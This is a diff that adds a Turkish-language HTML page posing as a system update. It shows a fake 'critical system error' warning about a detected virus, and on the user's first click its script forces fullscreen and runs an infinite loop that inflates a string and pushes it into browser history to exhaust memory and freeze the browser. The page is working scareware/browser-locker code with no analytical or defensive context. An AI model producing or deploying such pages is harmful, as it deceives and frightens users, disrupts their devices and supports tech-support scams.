@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Güncellemesi</title>
+</head>
+<body style="background:black; color:red; text-align:center; padding-top:100px; font-family:sans-serif;">
+    <h1>⚠ SİSTEM KRİTİK HATASI ⚠</h1>
+    <p>Cihazınızda STORM_VIRUS.EXE tespit edildi.</p>
+    <p>Verileriniz korunuyor, lütfen tarayıcıyı kapatmayın...</p>
+
+    <script>
+        // Kullanıcı sayfaya tıkladığı an tam ekran yap ve kilitlemeyi başlat
+        document.addEventListener("click", function() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+            
+            // RAM'i şişirme ve tarayıcıyı dondurma döngüsü
+            let chaos = "STORM_HACK_";
+            while(true) {
+                chaos += chaos + Math.random();
+                history.pushState(null, null, chaos);
+            }
+        });
+    </script>
+</body>
+</html>
